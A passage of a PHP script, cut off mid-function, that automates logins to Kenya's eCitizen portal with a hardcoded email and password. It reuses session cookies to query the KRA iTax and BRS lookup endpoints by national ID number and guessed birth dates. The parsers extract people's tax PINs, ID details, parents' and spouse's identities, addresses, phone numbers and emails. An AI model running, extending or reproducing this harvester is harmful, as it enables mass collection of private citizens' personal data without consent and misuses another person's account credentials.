<?php
ini_set('memory_limit', '-1');

use simplehtmldom\HtmlDocument;



use thiagoalessio\TesseractOCR\TesseractOCR;

if (file_exists("./tablesData.json")) {
    $path = "./";
} elseif (file_exists("../tablesData.json")) {
    $path = "../";
} elseif (file_exists("../../tablesData.json")) {
    $path = "../../";
}

require $path . '/vendor/autoload.php';

session_start();

include $path . 'includes/inner_core.php';


include $path . 'includes/security.php';


$httpClient = new \simplehtmldom\HtmlWeb();

function authCookie()
{
    global $httpClient;
    $url = 'https://accounts.ecitizen.go.ke/register/citizen';

    $cookiesFile = './cookies/_single_signon_key.txt';

    $file_data = fopen($cookiesFile, "w");

    fwrite($file_data, '');

    fclose($file_data);

    try {
        $ch = curl_init($url);
        if ($ch === false) {
            throw new Exception('failed to initialize');
        }
        curl_setopt($ch, CURLOPT_COOKIEJAR, realpath($cookiesFile)); // write
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        # sending manually set cookie

        $response = curl_exec($ch);
        $f_href = (new HtmlDocument())->load($response)->find('input[name="_csrf_token"]', 0)->value . PHP_EOL;

        $pattern = '/\s*/m';
        $replace = '';
        $removedLinebaksAndWhitespace = preg_replace($pattern, $replace, $f_href);

        if ($response === false) {
            throw new Exception(curl_error($ch), curl_errno($ch));
        }
    } catch (Exception $e) {

        trigger_error(
            sprintf(
                'Curl failed with error #%d: %s',
                $e->getCode(),
                $e->getMessage()
            ),
            E_USER_ERROR
        );
    } finally {
        // Close curl handle unless it failed to initialize
        if (is_resource($ch)) {
            curl_close($ch);
        }
    }

    return $removedLinebaksAndWhitespace;
}

function readkey($file)
{
    $dt1 = file_get_contents('./cookies/' . $file . '.txt');
    $dt2 = str_replace('_single_signon_key', '', strstr($dt1, '_single_signon_key'));
    $pattern = '/\s*/m';
    $replace = '';
    $removedLinebaksAndWhitespace = preg_replace($pattern, $replace, $dt2);
    return $removedLinebaksAndWhitespace;
}

function read_web_key()
{
    $dt1 = file_get_contents('./cookies/_single_signon_key_process_1.txt');
    $dt2 = str_replace('_web_key', '', strstr($dt1, '_web_key'));
    $dt3 =  substr($dt2, 0, strpos($dt2, "#HttpOnly_accounts.ecitizen.go.ke"));

    $pattern = '/\s*/m';
    $replace = '';
    $removedLinebaksAndWhitespace = preg_replace($pattern, $replace, $dt3);

    return $removedLinebaksAndWhitespace;
}

function read_automzero_key()
{
    // process_1();
    $dt1 = file_get_contents('./cookies/_single_signon_key_process_1.txt');
    //$dt2 = str_replace('_automzero_key', '', strstr($dt1, '_automzero_key'));
    $dt2 = strstr($dt1, '_automzero_key');
    //$dt3 =  substr($dt2, 0, strpos($dt2, "#HttpOnly_brs.ecitizen.go.ke"));
    $dt3 =  substr($dt2, 0, strpos($dt2, "#HttpOnly_accounts.ecitizen.go.ke"));

    $dt4 = str_replace("_automzero_key", "", $dt3);

    $pattern = '/\s*/m';
    $replace = '';
    $removedLinebaksAndWhitespace = preg_replace($pattern, $replace, $dt4);

    return $removedLinebaksAndWhitespace;
}

function read_single_signon_key_batch()
{
    //process_1();
    $dt1 = file_get_contents('./cookies/_single_signon_key_process_1.txt');
    $dt2 = str_replace('_single_signon_key', '', strstr($dt1, '_single_signon_key'));
    //$dt3 =  substr($dt2, 0, strpos($dt2, "#HttpOnly_accounts.ecitizen.go.ke"));

    $pattern = '/\s*/m';
    $replace = '';
    $removedLinebaksAndWhitespace = preg_replace($pattern, $replace, $dt2);

    return $removedLinebaksAndWhitespace;
}

function web_key()
{
    $file_name = './cookies/web_key.json';
    if (file_exists($file_name)) {
        $data = json_decode(file_get_contents($file_name), true);
        $time = time() - $data['time'];

        if ($time < 7140) {
            $web_key = $data['web_key'];
        } else {
            process_1();
            $web_key = read_web_key();
            $structure = [
                "web_key" => $web_key,
                "time" => time()
            ];

            $structure_data = json_encode($structure);

            $file_data = fopen($file_name, "w");

            fwrite($file_data, $structure_data);

            fclose($file_data);
        }
        return $web_key;
    } else {
        process_1();
        $web_key = read_web_key();
        $structure = [
            "web_key" => $web_key,
            "time" => time()
        ];

        $structure_data = json_encode($structure);

        $file_data = fopen($file_name, "w");

        fwrite($file_data, $structure_data);

        fclose($file_data);

        return $web_key;
    }
}

function login($url, $data)
{

    $cookiesFile = './cookies/_single_signon_key_login.txt';

    $file_data = fopen($cookiesFile, "w");

    fwrite($file_data, '');

    fclose($file_data);


    try {
        $ch = curl_init($url);
        if ($ch === false) {
            throw new Exception('failed to initialize');
        }
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_COOKIEJAR, realpath($cookiesFile)); // write
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, true);

        # sending manually set cookie
        curl_setopt($ch, CURLOPT_HTTPHEADER, array("Cookie: _single_signon_key=" . readkey("_single_signon_key") . "; Path=/; Expires=Sun, 07 Jan 2030 11:23:18 GMT;"));
        $response = curl_exec($ch);

        $skip = intval(curl_getinfo($ch, CURLINFO_HEADER_SIZE));
        $responseHeader = substr($response, 0, $skip);
        $data_b =  substr($response, $skip);

        if ($response === false) {
            throw new Exception(curl_error($ch), curl_errno($ch));
        }
    } catch (Exception $e) {

        trigger_error(
            sprintf(
                'Curl failed with error #%d: %s',
                $e->getCode(),
                $e->getMessage()
            ),
            E_USER_ERROR
        );
    } finally {
        // Close curl handle unless it failed to initialize
        if (is_resource($ch)) {
            curl_close($ch);
        }
    }

    return $responseHeader;
}

function authorize()
{
    global $httpClient;

    $fields = [
        '_csrf_token' => authCookie(),

        'auth[pwd]' => '24051786',
        'auth[username]' => 'Waroruaalex640@gmail.com',
    ];

    $url = 'https://accounts.ecitizen.go.ke/login';

    login($url, $fields);

    $url = 'https://accounts.ecitizen.go.ke/authorize?return_url=http://brs.ecitizen.go.ke/auth/sso-redirect?redirect_to=%2Fdashboard%2Fapplications';

    $cookiesFile = './cookies/_single_signon_key_authorize.txt';

    $file_data = fopen($cookiesFile, "w");

    fwrite($file_data, '');

    fclose($file_data);

    try {
        $ch = curl_init($url);
        if ($ch === false) {
            throw new Exception('failed to initialize');
        }
        curl_setopt($ch, CURLOPT_COOKIEJAR, realpath($cookiesFile)); // write
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        # sending manually set cookie
        curl_setopt($ch, CURLOPT_HTTPHEADER, array("Cookie: _single_signon_key=" . readkey("_single_signon_key_login") . "; Path=/; Expires=Sun, 07 Jan 2030 11:23:18 GMT;"));

        $response = curl_exec($ch);



        $skip = intval(curl_getinfo($ch, CURLINFO_HEADER_SIZE));
        $responseHeader = substr($response, 0, $skip);
        $data_b =  substr($response, $skip);

        $f_href = (new HtmlDocument())->load($response)->find('input[name="_csrf_token"]', 0)->value . PHP_EOL;

        $pattern = '/\s*/m';
        $replace = '';
        $removedLinebaksAndWhitespace = preg_replace($pattern, $replace, $f_href);

        if ($response === false) {
            throw new Exception(curl_error($ch), curl_errno($ch));
        }
    } catch (Exception $e) {

        trigger_error(
            sprintf(
                'Curl failed with error #%d: %s',
                $e->getCode(),
                $e->getMessage()
            ),
            E_USER_ERROR
        );
    } finally {
        // Close curl handle unless it failed to initialize
        if (is_resource($ch)) {
            curl_close($ch);
        }
    }

    return $removedLinebaksAndWhitespace;
}

function process_1()
{

    $data = [
        '_csrf_token' => authorize(),

        'allow' => '1',
    ];

    $url = 'https://accounts.ecitizen.go.ke/authorize?return_url=http%3A%2F%2Fbrs.ecitizen.go.ke%2Fauth%2Fsso-redirect%3Fredirect_to%3D%2Fdashboard&request_logger=';

    $cookiesFile = './cookies/_single_signon_key_process_1.txt';

    $file_data = fopen($cookiesFile, "w");

    fwrite($file_data, '');

    fclose($file_data);

    build_file('./cookies/_single_signon_key_process_1.txt', '');


    try {
        $ch = curl_init($url);
        if ($ch === false) {
            throw new Exception('failed to initialize');
        }
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_COOKIEJAR, realpath($cookiesFile)); // write
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_HEADER, true);

        # sending manually set cookie
        curl_setopt($ch, CURLOPT_HTTPHEADER, array("Cookie: _single_signon_key=" . readkey("_single_signon_key_authorize") . "; Path=/; Expires=Sun, 07 Jan 2030 11:23:18 GMT;"));
        $response = curl_exec($ch);

        $skip = intval(curl_getinfo($ch, CURLINFO_HEADER_SIZE));
        $responseHeader = substr($response, 0, $skip);
        $data_b =  substr($response, $skip);

        if ($response === false) {
            throw new Exception(curl_error($ch), curl_errno($ch));
        }
    } catch (Exception $e) {

        trigger_error(
            sprintf(
                'Curl failed with error #%d: %s',
                $e->getCode(),
                $e->getMessage()
            ),
            E_USER_ERROR
        );
    } finally {
        // Close curl handle unless it failed to initialize
        if (is_resource($ch)) {
            curl_close($ch);
        }
    }

    return $response;
}

function scrape($file)
{
    $httpClient = new \simplehtmldom\HtmlWeb();
    ////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////
    ///////////////         HOME PAGE TRENDING            ///////////////////////////////
    $output = '';
    //Title
    $content = $httpClient->load($file);


    //Image
    //$stss = $content->find(' h2');
    //$status = $stss[0]->plaintext;

    $st2 = (new HtmlDocument())->load($file);
    $st3 = $st2->find('div.section-title h2', 0);
    $st4 = $st2->find('div.section-title p', 0);
    $st5 = $st2->find('div#mainnow table.table tr td', 1);
    $output = '';
    if (isset($st3->plaintext) && !isset($st4->plaintext) && isset($st5->innertext)) {
        $fname = $st2->find('div#mainnow table.table tr td', 1)->innertext . PHP_EOL;
        $output .= $fname . '<br/>';
        $mname = str_replace('Middle Name:', '', $st2->find('div#mainnow table.table comment', 0)->innertext . PHP_EOL);
        $output .= $mname . '<br/>';
        $sname = $st2->find('div#mainnow table.table tr td', 3)->innertext . PHP_EOL;
        $output .= $sname . '<br/>';

        $obj1 = $st2->find('div#mainnow table.table comment', 1)->innertext . PHP_EOL;

        $gender = (new HtmlDocument())->load($obj1)->find('tr td', 1)->innertext . PHP_EOL;
        $output .= $gender . '<br/>';

        $dob = (new HtmlDocument())->load($obj1)->find('tr td', 3)->innertext . PHP_EOL;
        $output .= $dob . '<br/>';

        $county = $st2->find('div#mainnow table.table tr td', 5)->innertext . PHP_EOL;
        $output .= $county . '<br/>';

        $const = $st2->find('div#mainnow table.table tr td', 7)->innertext . PHP_EOL;
        $output .= $const . '<br/>';

        $ward = $st2->find('div#mainnow table.table tr td', 9)->innertext . PHP_EOL;
        $output .= $ward . '<br/>';

        $station = $st2->find('div#mainnow table.table tr td', 11)->innertext . PHP_EOL;
        $output .= $station . '<br/>';

        $iebc = [
            // 'firstname' => strip_tags($fname),
            // 'midname' => strip_tags($mname),
            //  'surname' => strip_tags($sname),
            //  'gender' => strip_tags($gender),
            // 'dob' => strip_tags($dob),
            'county' => strip_tags($county),
            'constituency' => strip_tags($const),
            'ward' => strip_tags($ward),
            'station' => strip_tags($station),
        ];
        $output = $iebc;
    } else {
        $output = 'NotFound';
    }


    //$output = $status;
    //*


    // return $output;
    return $output;
}


function kra($id, $day, $month, $year)
{
    $url1 = 'https://itax.kra.go.ke/KRA-Portal/dwr/call/plaincall/FetchRegistrationDtl.getNatRegDtlsByNIDAndDOB.dwr';
    if ($day == '') {
        $day = 01;
    }
    if ($day == 31 && $month == 12) {
        $day = 01;
        $month = 07;
    }

    if ($month == '') {
        $month = 07;
    }
    if ($month == 01 && $year < 2004) {
        $month = 07;
    }


    if ($year == '') {
        $object = 'YearErr';
    } else {

        $fields = array(
            'callCount' => 1,
            'windowName' => '#TS00000000076=6d93d98c1087386b0063b74400cba5c07238ced830ad9da7022f6be4c951d5f7c3',
            'c0-scriptName' => 'FetchRegistrationDtl',
            'c0-methodName' => 'getNatRegDtlsByNIDAndDOB',
            'c0-id' => 0,
            'c0-param0' => 'string:' . $id,
            'c0-param1' => 'string:' . $day . '%2F' . $month . '%2F' . $year . '',
            'batchId' => 2,
            'page' => '/KRA-Portal/eRegIndi.htm?actionCode=loadIndiOnlineForm',
            'httpSessionId' => '',
            'scriptSessionId' => '1DFDC6C7DB955359864E6FBD86454D9F',
        );

        $data = httpPost($url1, $fields);

        $dt2 = strstr($data, '{activeFlag');

        $dt3 = str_replace(");", '', $dt2);
        $dt4 = str_replace("new Date(", '', $dt3);
        $dt5 = str_replace("),", ',', $dt4);
        $dt6 = str_replace(",", ',"', $dt5);
        $dt7 = str_replace(":", '":', $dt6);
        $dt8 = str_replace("{", '{"', $dt7);
        $dt9 = str_replace("\'", "", $dt8);

        $obj = json_decode($dt9, true);
        if (is_array($obj)) {
            $object = $obj;
        } else {
            $object = $dt9;
        }
    }
    //$object = $dt8;

    return $object;
}

function ctGet($id, $fname)
{
    $file = './cookies/_csrf.json';
    if (file_exists($file)) {
        $block = json_decode(file_get_contents($file), true);
        if ((time() - $block['time']) > 7500) {
            $block = [];
            $csrf_token = $block['csrf'] = csrf_capture();
            $block['time'] = time();

            build_file($file, json_encode($block));
        } else {
            $csrf_token = $block['csrf'];
        }
    } else {
        $block = [];
        $csrf_token = $block['csrf'] = csrf_capture();
        $block['time'] = time();

        build_file($file, json_encode($block));
    }


    $url = 'https://brs.ecitizen.go.ke/lookup-services/1/execute';
    // $data = [ 'id_number' => $id, 'citizenship' => 'citizen', 'first_name' => $fname ];
    $data = [
        'params' => [
            "id_type" => "NationalIdentification",
            "id_number" => $id,
            "first_name" => $fname
        ],
        'data_template_id' => 'b877596f-3cde-4a60-9ff5-bdc24596130c',
    ];
    try {
        $ch = curl_init($url);
        if ($ch === false) {
            throw new Exception('failed to initialize');
        }
        //curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        # sending manually set cookie
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            "X-CSRF-TOKEN: " . $csrf_token,
            "Cookie: _automzero_key=" . read_automzero_key() . "; Path=/; Expires=Sun, 07 Jan 2028 11:23:18 GMT;",
        ));

        $response = curl_exec($ch);
        if ($response === false) {
            throw new Exception(curl_error($ch), curl_errno($ch));
        }
    } catch (Exception $e) {

        trigger_error(
            sprintf(
                'Curl failed with error #%d: %s',
                $e->getCode(),
                $e->getMessage()
            ),
            E_USER_ERROR
        );
    } finally {
        // Close curl handle unless it failed to initialize
        if (is_resource($ch)) {
            curl_close($ch);
        }
    }

    return $response;
}


function scrape_2($data)
{
    $st2 = (new HtmlDocument())->load($data);
    $data = array();
    $data['kra_pin'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td table tr td.whitepapartdBig', 0)->plaintext);
    $data['full_name'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td table tr td.whitepapartdBig', 1)->plaintext);
    $data['citizenship'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#indiCitizenship td.whitepapartdBig', 0)->plaintext);
    $data['major_group'] = strstr(strip_tags($st2->find('div.panelGridHead tr#page1 table tr td fieldset td.whitepapartdBig', 1)->plaintext), '-');
    $data['sub_group'] = strstr(strip_tags($st2->find('div.panelGridHead tr#page1 table tr td fieldset td.whitepapartdBig', 2)->plaintext), '-');
    $data['minor_group'] = strstr(strip_tags($st2->find('div.panelGridHead tr#page1 table tr td fieldset td.whitepapartdBig', 3)->plaintext), '-');

    $data['id_no'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#kenyan td.whitepapartdBig', 0)->plaintext);
    $data['id_issue_date'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#kenyan td.whitepapartdBig', 1)->plaintext);
    $data['id_issue_place'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#kenyan td.whitepapartdBig', 2)->plaintext);
    $data['nssf_no'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#kenyan td.whitepapartdBig', 4)->plaintext);
    $data['first_name_2'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#kenyan td.whitepapartdBig', 5)->plaintext);
    $data['middle_name_2'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#kenyan td.whitepapartdBig', 6)->plaintext);
    $data['last_name_2'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#kenyan td.whitepapartdBig', 7)->plaintext);
    $data['dob_2'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#kenyan td.whitepapartdBig', 8)->plaintext);
    $data['place_of_birth'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#kenyan td.whitepapartdBig', 9)->plaintext);
    $data['sex_2'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#kenyan td.whitepapartdBig', 10)->plaintext);
    $data['marital_status'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#kenyan td.whitepapartdBig', 11)->plaintext);
    $data['father_id_no'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#kenyan td.whitepapartdBig', 12)->plaintext);
    $data['father_first_name'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#kenyan td.whitepapartdBig', 13)->plaintext);
    $data['father_middle_name'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#kenyan td.whitepapartdBig', 14)->plaintext);
    $data['father_last_name'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#kenyan td.whitepapartdBig', 15)->plaintext);
    $data['father_place_of_birth'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#kenyan td.whitepapartdBig', 17)->plaintext);
    $data['father_dob'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#kenyan td.whitepapartdBig', 16)->plaintext);
    $data['mother_id_no'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#kenyan td.whitepapartdBig', 18)->plaintext);
    $data['mother_first_name'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#kenyan td.whitepapartdBig', 19)->plaintext);
    $data['mother_middle_name'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#kenyan td.whitepapartdBig', 20)->plaintext);
    $data['mother_last_name'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#kenyan td.whitepapartdBig', 21)->plaintext);
    $data['mother_place_of_birth'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#kenyan td.whitepapartdBig', 23)->plaintext);
    $data['mother_dob'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#kenyan td.whitepapartdBig', 22)->plaintext);
    $data['spouse_id_no'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#kenyan td.whitepapartdBig', 24)->plaintext);
    $data['spouse_first_name'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#kenyan td.whitepapartdBig', 25)->plaintext);
    $data['spouse_middle_name'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#kenyan td.whitepapartdBig', 26)->plaintext);
    $data['spouse_last_name'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#kenyan td.whitepapartdBig', 27)->plaintext);
    $data['spouse_dob'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#kenyan td.whitepapartdBig', 28)->plaintext);
    $data['spouse_place_of_birth'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#kenyan td.whitepapartdBig', 29)->plaintext);
    $data['lr_no_1'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#kenyan div#addContactKE div#txtTxprKELocResidentAddr td.whitepapartdBig', 0)->plaintext);
    $data['building_1'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#kenyan div#addContactKE div#txtTxprKELocResidentAddr td.whitepapartdBig', 1)->plaintext);
    $data['street_road_1'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#kenyan div#addContactKE div#txtTxprKELocResidentAddr td.whitepapartdBig', 2)->plaintext);
    $data['city_town_1'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#kenyan div#addContactKE div#txtTxprKELocResidentAddr td.whitepapartdBig', 3)->plaintext);
    $data['county_1'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#kenyan div#addContactKE div#txtTxprKELocResidentAddr td.whitepapartdBig', 4)->plaintext);
    $data['district_1'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#kenyan div#addContactKE div#txtTxprKELocResidentAddr td.whitepapartdBig', 5)->plaintext);
    $data['area_locality_1'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#kenyan div#addContactKE div#txtTxprKELocResidentAddr td.whitepapartdBig', 6)->plaintext);
    $data['descriptive_address_1'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#kenyan div#addContactKE div#txtTxprKELocResidentAddr td.whitepapartdBig', 6)->plaintext);
    $data['postal_code_1'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#kenyan div#addContactKE div#txtTxprKELocResidentAddr tr#paRow1 td.whitepapartdBig', 0)->plaintext);
    $data['postal_town'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#kenyan div#addContactKE div#txtTxprKELocResidentAddr tr#paRow1 td.whitepapartdBig', 1)->plaintext);
    $data['po_box_1'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#kenyan div#addContactKE div#txtTxprKELocResidentAddr tr#paRow1 td.whitepapartdBig', 2)->plaintext);
    $data['address_line_4'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#kenyan div#addContactKE div#txtTxprKELocNonResidentAddr table.tab3 td.whitepapartdBig', 1)->plaintext);
    $data['address_line_5'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#kenyan div#addContactKE div#txtTxprKELocNonResidentAddr table.tab3 td.whitepapartdBig', 3)->plaintext);
    $data['address_line_6'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#kenyan div#addContactKE div#txtTxprKELocNonResidentAddr table.tab3 td.whitepapartdBig', 5)->plaintext);

    //$data['country_1'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#kenyan div#addContactKE div#txtTxprKELocNonResidentAddr td.whitepapartdBig option[selected]', 7)->plaintext);
    $data['telephone_number'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#kenyan div#addContactKE fieldset table[class!=tab3] tr[!id] td.whitepapartdBig', 8)->plaintext);
    $data['mobile_number'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#kenyan div#addContactKE fieldset table[class!=tab3] tr[!id] td.whitepapartdBig', 9)->plaintext);
    $data['mobile_number_2'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#kenyan div#addContactKE fieldset table[class!=tab3] tr[!id] td.whitepapartdBig', 10)->plaintext);
    $data['mobile_number_3'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#kenyan div#addContactKE fieldset table[class!=tab3] tr[!id] td.whitepapartdBig', 11)->plaintext);
    $data['main_email_1'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#kenyan div#addContactKE fieldset table[class!=tab3] tr[!id] td.whitepapartdBig', 12)->plaintext);
    $data['secondary_email_1'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#kenyan div#addContactKE fieldset table[class!=tab3] tr[!id] td.whitepapartdBig', 13)->plaintext);

    $data['nssf_no_1'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#nonKenyan td.whitepapartdBig', 1)->plaintext);
    $data['alien_no'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#nonKenyan td.whitepapartdBig', 2)->plaintext);
    $data['first_name'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#nonKenyan td.whitepapartdBig', 3)->plaintext);
    $data['middle_name'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#nonKenyan td.whitepapartdBig', 4)->plaintext);
    $data['last_name'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#nonKenyan td.whitepapartdBig', 5)->plaintext);
    $data['origin_country'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#nonKenyan td.whitepapartdBig', 6)->plaintext);
    $data['work_permit'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#nonKenyan td.whitepapartdBig', 7)->plaintext);
    $data['sex'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#nonKenyan td.whitepapartdBig', 8)->plaintext);
    $data['dob'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#nonKenyan td.whitepapartdBig', 9)->plaintext);
    $data['lr_no'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#nonKenyan div#addContactNKE tr#pfaRow1 td.whitepapartdBig', 0)->plaintext);
    $data['building'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#nonKenyan div#addContactNKE tr#pfaRow1 td.whitepapartdBig', 1)->plaintext);
    $data['street_road'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#nonKenyan div#addContactNKE tr#pfaRow2 td.whitepapartdBig', 0)->plaintext);
    $data['city_town'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#nonKenyan div#addContactNKE tr#pfaRow2 td.whitepapartdBig', 1)->plaintext);
    $data['county'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#nonKenyan div#addContactNKE tr#pfaRow3 td.whitepapartdBig', 0)->plaintext);
    $data['district'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#nonKenyan div#addContactNKE tr#pfaRow3 td.whitepapartdBig', 1)->plaintext);
    $data['tax_area'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#nonKenyan div#addContactNKE tr#pfaRow4 td.whitepapartdBig', 0)->plaintext);
    $data['descriptive_address'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#nonKenyan div#addContactNKE tr#pfaRow4 td.whitepapartdBig', 1)->plaintext);
    $data['postal_code'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#nonKenyan div#addContactNKE tr#paRow1 td.whitepapartdBig', 0)->plaintext);
    $data['town'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#nonKenyan div#addContactNKE tr#paRow1 td.whitepapartdBig', 1)->plaintext);
    $data['po_box'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#nonKenyan div#addContactNKE tr#paRow1 td.whitepapartdBig', 2)->plaintext);

    $data['first_name_1'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#nonKenyanNonResi td.whitepapartdBig', 0)->plaintext);
    $data['middle_name_1'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#nonKenyanNonResi td.whitepapartdBig', 1)->plaintext);
    $data['last_name_1'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#nonKenyanNonResi td.whitepapartdBig', 2)->plaintext);
    $data['dob_1'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#nonKenyanNonResi td.whitepapartdBig', 3)->plaintext);
    $data['sex_1'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#nonKenyanNonResi td.whitepapartdBig', 4)->plaintext);
    $data['passport_no'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#nonKenyanNonResi td.whitepapartdBig', 5)->plaintext);
    $data['passport_issue_country'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#nonKenyanNonResi td.whitepapartdBig', 6)->plaintext);
    $data['passport_issue_date'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#nonKenyanNonResi td.whitepapartdBig', 7)->plaintext);
    $data['passport_expiry_date'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#nonKenyanNonResi td.whitepapartdBig', 8)->plaintext);
    $data['address_line_1'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#nonKenyanNonResi td.whitepapartdBig', 9)->plaintext);
    $data['address_line_2'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#nonKenyanNonResi td.whitepapartdBig', 10)->plaintext);
    $data['address_line_3'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#nonKenyanNonResi td.whitepapartdBig', 11)->plaintext);
    $data['country'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#nonKenyanNonResi td.whitepapartdBig', 12)->plaintext);
    $data['telephone_no'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#nonKenyanNonResi td.whitepapartdBig', 13)->plaintext);
    $data['mobile_no_1'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#nonKenyanNonResi td.whitepapartdBig', 14)->plaintext);
    $data['mobile_no_2'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#nonKenyanNonResi td.whitepapartdBig', 15)->plaintext);
    $data['mobile_no_3'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#nonKenyanNonResi td.whitepapartdBig', 16)->plaintext);
    $data['main_email'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#nonKenyanNonResi td.whitepapartdBig', 17)->plaintext);
    $data['secondary_email'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div#nonKenyanNonResi td.whitepapartdBig', 18)->plaintext);

    $data['sms_notifications'] = strip_tags($st2->find('div.panelGridHead tr#page1 table tr td div fieldset#smsSectionIndi td.whitepapartdBig', 0)->plaintext);

